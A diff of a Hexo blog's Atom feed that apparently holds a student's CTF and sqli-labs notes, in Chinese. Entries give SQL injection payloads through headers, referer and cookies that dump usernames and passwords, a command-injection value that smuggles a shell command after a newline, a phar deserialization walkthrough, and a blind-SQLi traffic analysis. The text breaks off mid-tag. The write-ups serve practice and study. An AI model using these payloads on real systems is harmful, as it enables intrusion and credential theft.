@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-09-17T17:39:10.000Z</updated>
+  <updated>2022-04-26T11:51:14.000Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,86 +15,6 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>Hello World</title>
-    <link href="http://example.com/2023/11/25/hello-world/"/>
-    <id>http://example.com/2023/11/25/hello-world/</id>
-    <published>2023-11-25T06:25:33.920Z</published>
-    <updated>2021-09-17T17:39:10.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>20220427</title>
-    <link href="http://example.com/2022/04/27/20220427/"/>
-    <id>http://example.com/2022/04/27/20220427/</id>
-    <published>2022-04-27T13:04:04.000Z</published>
-    <updated>2022-04-27T13:17:14.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="phar序列化"><a href="#phar序列化" class="headerlink" title="phar序列化"></a>phar序列化</h1><h2 id="swpuctf2018simplephp1"><a href="#swpuctf2018simplephp1" class="headerlink" title="swpuctf2018simplephp1"></a>swpuctf2018simplephp1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;<span class="comment">#str[&#x27;str&#x27;]有个成员source，则str[&#x27;str&#x27;]是一个类str[&#x27;str&#x27;]=new Test()</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)#$<span class="title">key</span>=<span class="title">source</span>自动复制，因为<span class="title">show</span>的</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];<span class="comment">#$value=&quot;/var/www/html/f1ag.php&quot;</span></span><br><span class="line">                                         <span class="comment">#$params[key]=&quot;/var/www/html/f1ag.php&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>C1e4r</p><p>分析：__construct($name)是在C1e4r被创造时执行</p><p>__destruct()是在被销毁时执行</p><h3 id="Show"><a href="#Show" class="headerlink" title="Show"></a>Show</h3><p>分析：__toString()是在被当作字符串打印时执行，可以由C1e4r中的echo触发</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;phar序列化&quot;&gt;&lt;a href=&quot;#phar序列化&quot; class=&quot;headerlink&quot; title=&quot;phar序列化&quot;&gt;&lt;/a&gt;phar序列化&lt;/h1&gt;&lt;h2 id=&quot;swpuctf2018simplephp1&quot;&gt;&lt;a href=&quot;#swpuctf2018s</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>20220425</title>
-    <link href="http://example.com/2022/04/25/20220425/"/>
-    <id>http://example.com/2022/04/25/20220425/</id>
-    <published>2022-04-25T12:59:23.000Z</published>
-    <updated>2022-04-25T13:31:36.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="favorite-num"><a href="#favorite-num" class="headerlink" title="favorite_num"></a>favorite_num</h1><h2 id="1-php数组下标的整形溢出"><a href="#1-php数组下标的整形溢出" class="headerlink" title="1.php数组下标的整形溢出"></a>1.php数组下标的整形溢出</h2><p>也就是说数组中下表为0的元素与下表为4294967296 //0x100000000 的元素表示同一个</p><h2 id="2-绕过对num的检查"><a href="#2-绕过对num的检查" class="headerlink" title="2.绕过对num的检查"></a>2.绕过对num的检查</h2><p>%0a（换行符来绕过）</p><p>%0als /</p><p>然后用tac读取得到flag</p><p>stuff%5B4294967296%5D=admin&amp;stuff%5B1%5D=user&amp;num=123%0atac <code>find / -inum 37487226</code></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;favorite-num&quot;&gt;&lt;a href=&quot;#favorite-num&quot; class=&quot;headerlink&quot; title=&quot;favorite_num&quot;&gt;&lt;/a&gt;favorite_num&lt;/h1&gt;&lt;h2 id=&quot;1-php数组下标的整形溢出&quot;&gt;&lt;a href=&quot;</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>2022.04.22</title>
-    <link href="http://example.com/2022/04/22/2022-04-22/"/>
-    <id>http://example.com/2022/04/22/2022-04-22/</id>
-    <published>2022-04-22T11:24:06.000Z</published>
-    <updated>2022-04-22T11:25:26.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;</summary>
-      
-    
-    
-    
-    
-  </entry>
   
   <entry>
     <title>20220418</title>
@@ -481,6 +401,100 @@
     
     
     <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>hctf2018warmup</title>
+    <link href="http://example.com/2021/12/14/warmup/"/>
+    <id>http://example.com/2021/12/14/warmup/</id>
+    <published>2021-12-14T12:53:10.000Z</published>
+    <updated>2022-01-30T04:13:44.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="buu的web入门第一题"><a href="#buu的web入门第一题" class="headerlink" title="buu的web入门第一题"></a>buu的web入门第一题</h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;buu的web入门第一题&quot;&gt;&lt;a href=&quot;#buu的web入门第一题&quot; class=&quot;headerlink&quot; title=&quot;buu的web入门第一题&quot;&gt;&lt;/a&gt;buu的web入门第一题&lt;/h1&gt;</summary>
+      
+    
+    
+    
+    <category term="php学习 代码审计" scheme="http://example.com/categories/php%E5%AD%A6%E4%B9%A0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>编码篇</title>
+    <link href="http://example.com/2021/12/12/%E7%BC%96%E7%A0%81%E7%AF%87/"/>
+    <id>http://example.com/2021/12/12/%E7%BC%96%E7%A0%81%E7%AF%87/</id>
+    <published>2021-12-12T07:11:28.000Z</published>
+    <updated>2022-02-23T04:50:38.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Morse编码"><a href="#Morse编码" class="headerlink" title="Morse编码"></a>Morse编码</h1><p>摩尔斯电码(Morse code)是一种时通时断的信号代码，通过不同的排列 顺序来表达不同的英文字母、数字和标点符号。是由美国人艾尔菲德·维 尔(Alfred Lewis Vail)与萨缪尔·摩尔斯(Samuel Finley Breese Morse) 在1836年发明。由点（·）和划（-）组成。</p><p><img src="https://s2.loli.net/2021/12/12/B4nJizpyuHMCXm2.png" alt="CSDN_1639293456784.jpg"></p><p><a href="http://www.mathsking.net/morse.htm">莫斯在线编码</a></p><h1 id="ascii编码"><a href="#ascii编码" class="headerlink" title="ascii编码"></a>ascii编码</h1><p>ASCII(American Standard Code for Information  Interchange，美国信息交换标准代码)是基于拉丁字母的一套  电脑编码系统，主要用于显示现代英语和其他西欧语言。它是现今最通用的单字节编码系统，并等同于国际标准ISO/IEC 646。</p><p><img src="https://s2.loli.net/2021/12/12/tgWfoxSkA892TcG.png" alt="CSDN_1639293840648.jpg"></p><p><a href="http://www.ab126.com/goju/1711.html">ascii码翻译器</a></p><h1 id="Tap-Code敲击码"><a href="#Tap-Code敲击码" class="headerlink" title="Tap Code敲击码"></a>Tap Code敲击码</h1><p> 敲击码(Tap code)是一种以非常简单的方式对文本信息进行 编码的方法。因该编码对信息通过使用一系列的点击声音来编 码而命名，敲击码是基于 5 ×5 方格波利比奥斯方阵来实现的， 不同点是是用 K 字母被整合到 C 中。</p><p><img src="https://s2.loli.net/2021/12/12/1YukBIh74wpg3Ld.png" alt="CSDN_1639294020485.jpg"></p><p>2,3 1,5 3,1 3,1 3,4 ==&gt;H E L L O 或 .. …/. …../… ./… ./… …./ ==&gt;H E L L O</p><h1 id="Base编码"><a href="#Base编码" class="headerlink" title="Base编码"></a>Base编码</h1><p> Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64 就是一种基于64(65)个可打印字符来表示二进制数据的方法。 a-z、A-Z、0-9、符号“+”、“/”（再加上作为补位的”=”，实际上是 65个字符） 。</p><p>  Base xx 中的 xx 表示的是采用多少个字符进行编码，比如说 base64 就是采用 64 个字符编码，由于 2 的 6 次方等于 64，所以每 6 个比特 为一个单元，对应某个可打印字符。</p><p>例如：d2VsY29tZQ==   ==&gt;welcome</p><p>特点：base64 结尾可能会有=号，但最多有2个 。</p><p>base32 结尾可能会有=号,最多有 3 个等号。</p><p>根据 base 的不同，字符集会有所限制 。 有可能需要自己加等号。</p><p><a href="http://tool.chinaz.com/tools/base64.aspx">base64在线解码</a></p><h1 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h1><p> URL编码,又叫百分号编码，是统一资源定位(URL)编码方式。URL地址 （常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊 用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码 处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js： 有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编 码方法很简单，在该字节ascii码的的16进制字符前面加%. 如空格字符， ascii码是32，对应16进制是‘20’，那么urlencode编码结果是:%20。</p><p>例如：URL%E7%BC%96%E7%A0%81   ==&gt; URL编码</p><p><a href="http://tool.oschina.net/encode?type=4">URL在线解码</a></p><h1 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h1><p> Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界 标准,包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案 的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进 制编码，以满足跨语言、跨平台进行文本转换、处理的要求。1990年开始 研发，1994年正式公布。</p><p><a href="http://tool.oschina.net/encode">Unicode在线解码</a></p><h1 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h1><p> JSFuck 可以让你只用 6 个字符 <a href=""> </a> ! + 来编写 JavaScript 程序</p><p><a href="http://www.bugku.com/tools/jsfuck/">jsfuck在线解码</a></p><h1 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h1><p> Brainfuck 是一种极小化的计算机语言，按照”Turing complete(完整图灵机) “思想设计 的语言，它的主要设计思路是:用最小的概念实现一种“简单”的语 言，BrainF**k 语言 只有八种符号，所有的操作都由这八种符号  &gt; &lt; + - . , [ ]  的组合来完成。</p><p><a href="https://www.splitbrain.org/services/ook">brainfuck在线解码</a></p><h1 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h1><p>凯撒密码（Caesar）加密时会将明文中的每个字母都按照其在字母表中的顺序向后（或 向前）移动固定数目（循环移动）作为密文。例如，当偏移量是左移 3 的时候（解密时 的密钥就是 3）。</p><p>  使用时，加密者查找明文字母表中需要加密的消息中的每一个字母所在位置，并且写下密 文字母表中对应的字母。需要解密的人则根据事先已知的密钥反过来操作，得到原来的明文。</p><p>  根据偏移量的不同，还存在若干特定的恺撒密码名称：</p><p>  偏移量为 10：Avocat （A→K）</p><p>  偏移量为 13：ROT13</p><p>  偏移量为 -5：Cassis （K 6）</p><p>  偏移量为 -6：Cassette （K 7）</p><p>例如：Uryyb,Jrypbzr   ==&gt; Hello,Welcome</p><p><a href="http://www.mxcz.net/tools/rot13.aspx">凯撒ROT13在线解码</a></p><p>参考链接：<a href="https://blog.csdn.net/Dog_Captain/article/d">https://blog.csdn.net/Dog_Captain/article/d</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;Morse编码&quot;&gt;&lt;a href=&quot;#Morse编码&quot; class=&quot;headerlink&quot; title=&quot;Morse编码&quot;&gt;&lt;/a&gt;Morse编码&lt;/h1&gt;&lt;p&gt;摩尔斯电码(Morse code)是一种时通时断的信号代码，通过不同的排列 顺序来表达不同的英文字母</summary>
+      
+    
+    
+    
+    <category term="misc" scheme="http://example.com/categories/misc/"/>
+    
+    
+    <category term="兼职miscer" scheme="http://example.com/tags/%E5%85%BC%E8%81%8Cmiscer/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>lesson18-23</title>
+    <link href="http://example.com/2021/11/28/lesson18/"/>
+    <id>http://example.com/2021/11/28/lesson18/</id>
+    <published>2021-11-28T01:20:42.000Z</published>
+    <updated>2022-02-10T03:00:02.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="less18-header-injection"><a href="#less18-header-injection" class="headerlink" title="less18 header injection"></a>less18 header injection</h1><p><img src="https://i.loli.net/2021/11/28/iUSL7pB8aXCKezf.png" alt="header injection.png"></p><p>登入成功返回我的ip地址和user agent</p><p>因为user agent在登入成功后会回显，所以理所当然的尝试在header的user agent注入</p><p>注入语句’ or updatexml(1,concat(0x7e,(database())),1) or ‘1’ =’1</p><p>直接在抓包处改</p><p><img src="https://i.loli.net/2021/11/28/IUwgv12aLkqbKDA.png" alt="header injection1.png"></p><p>后面就是正常的把database()改成其他的查库查列操作</p><p>或者使用方法二：</p><p>’ or updatexml（1，concat（0x7e，（database（））），1），‘’，‘’）#进行注入</p><h1 id="lesson-19-referer-injection"><a href="#lesson-19-referer-injection" class="headerlink" title="lesson 19 referer injection"></a>lesson 19 referer injection</h1><p>同样的方法选择用</p><ol><li><p>‘ or updatexml(1,concat(0x7e,(database())),1) and ‘1’=’1</p></li><li><p>‘ or updatexml(1,concat(0x7e,(database())),1) ,’’)#</p><p>来闭合在抓包referer处修改注入</p><p>与lesson18相同。</p></li></ol><h1 id="lesson-20-cookie-injection"><a href="#lesson-20-cookie-injection" class="headerlink" title="lesson 20 cookie injection"></a>lesson 20 cookie injection</h1><p>抓包，在cookie那里注入</p><p>cookie：uname=1’ union select 1,2,database()#</p><p>利用联合查询注入</p><p>查表</p><p>cookie：uname=1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ )#</p><p>查列</p><p>cookie：uname=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=’security’and table_name=’users’#</p><p>查字段</p><p>cookie：uname=1’ union select 1，2，group_concat(concat_ws(‘@@’,id,username,password)) from users</p><h1 id="lesson-21-cookie-injection"><a href="#lesson-21-cookie-injection" class="headerlink" title="lesson 21 cookie injection"></a>lesson 21 cookie injection</h1><p>跟lesson20思路一样，就是cookie明文经过base64加密</p><p><a href="https://tool.oschina.net/encrypt?type=3">base64在线加密</a></p><p>查库</p><p>‘) union select 1,2,database()#</p><p>表</p><p>‘) union select 1,group_concat(table_name) from information_schema.tables where table_schema=’security’),3#</p><p>列</p><p>)’ union select 1,2,(select goup_concat(column_name) from information_schema.columns where table_name=’users’)#</p><p>字段</p><p>‘) union select 1,group_concat(concat_ws(‘@@’,username,password)),2#</p><h1 id="lession-22-cookie-injection"><a href="#lession-22-cookie-injection" class="headerlink" title="lession 22 cookie injection"></a>lession 22 cookie injection</h1><p>和上一关一样，只是闭合单引号变成了双引号。</p><h1 id="lession-23"><a href="#lession-23" class="headerlink" title="lession 23"></a>lession 23</h1><p><img src="https://s2.loli.net/2022/02/09/VkWy5IBbQf1gpc2.png" alt="QQ截图20220209170517.png"></p><p>这里对#和–都做了转译</p><p>法一：因为被处理的是注释符号，所以只要用–+和#以外的的注释符就行了。（用;%00来注释）</p><p>法二：避免使用注释符，而是用and ‘1’=’1来包裹</p><p>查库</p><p>？id=-1’ union select 1,database(),3 and ‘1’=’1</p><p>查表</p><p>？id=-1’ union select 1,goup_concat(table_name)from information_schema.tables where table_schema=’security’ limit 0,1),3 and ‘1’=’1</p><p>查列</p><p>？id=-1’ union select 1,group_concat(column_name)from information_schema.columns where table=’users’),3 and’1’=’1 </p><p>查字段</p><p>？id=-1’ union select 1,group_concat(concat_ws(@@,username,password))from users,3 and ‘1’=’1</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;less18-header-injection&quot;&gt;&lt;a href=&quot;#less18-header-injection&quot; class=&quot;headerlink&quot; title=&quot;less18 header injection&quot;&gt;&lt;/a&gt;less18 header inj</summary>
+      
+    
+    
+    
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
+    
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>“流量包分析”之sqltest</title>
+    <link href="http://example.com/2021/11/24/%E2%80%9C%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E2%80%9D%E4%B9%8Bsqltest/"/>
+    <id>http://example.com/2021/11/24/%E2%80%9C%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E2%80%9D%E4%B9%8Bsqltest/</id>
+    <published>2021-11-24T12:41:47.000Z</published>
+    <updated>2022-02-23T04:50:28.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h1><p>原本只是想刷一刷sql注入的却意外的找到了一道misc题但是和sql注入关系紧密的sqltest。</p><p>这是一道流量包分析，首先先下载流量包。</p><p>然后百度下载可以打开浏览包的软件，O(∩_∩)O哈哈~~</p><h2 id="第一次查看流量包"><a href="#第一次查看流量包" class="headerlink" title="第一次查看流量包"></a>第一次查看流量包</h2><p><img src="https://i.loli.net/2021/11/24/Zk8itW9lrwKmVO4.png" alt="QQ截图20211124204947.png"></p><p>这密密麻麻的字确实让人望而却步，但是还是可以看出一些端倪。</p><p>比如其中有一些get请求意外的相似：</p><p>GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2020,%201))&gt;99 </p><p>8084    11.866325    10.0.2.15    172.16.80.11    HTTP    495    GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2020,%201))&gt;98 </p><p>8094    11.872110    10.0.2.15    172.16.80.11    HTTP    495    GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2020,%201))&gt;98 HTTP/1.1 </p><p>仔细看这不就是布尔盲注的爆破内容。</p><p>刚好解释了为啥这题的名字叫做sqltest</p><p>所以就简单了，道理就只要把最后一句查字段的爆破类容找出来就行，ascii码转一下就行了，但是！！我wireshark（查看浏览包的应用）没玩明白。。。惨惨π_π。</p><p>在查了一大堆教程以后，终于有了一点眉目。</p><p>首先在过滤器里搜索http（协议） get（请求）</p><p><img src="https://i.loli.net/2021/11/24/jBCIbVvTX5iGsxQ.png" alt="QQ截图20211124220332.png"></p><p>发现返回的的长度有两种1095和1025</p><p><img src="https://i.loli.net/2021/11/24/4ThqzAeRiHmEwul.png" alt="QQ截图20211124221517.png"></p><p>之所以返回变长了就是多了上面的部分。因此可知1095的语句是正确的</p><p>然后导出过滤concat</p><p><img src="https://i.loli.net/2021/11/24/luDcLFwZepoXjb5.png" alt="QQ截图20211124222854.png"></p><p>然后判断正确ascii码正确的为</p><p>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50  56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125</p><p>所对应为</p><p>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p><h1 id="关于wireshark"><a href="#关于wireshark" class="headerlink" title="关于wireshark"></a>关于wireshark</h1><p>wireshark是一个网络封包工具，可以截取各种网络数据包，并显示数据包详细信息</p><p><img src="https://i.loli.net/2021/11/26/oMcbNGYlUpP4Iqu.png" alt="wireshark.png"></p><p>详细使用类容参考<a href="https://blog.csdn.net/zzwwhhpp/article/details/113077747?utm_source=app&app_version=4.18.0&code=app_1562916241&uLinkId=usr1mkqgl919blen">csdn</a></p><p>执行ping+域名</p><h2 id="界面"><a 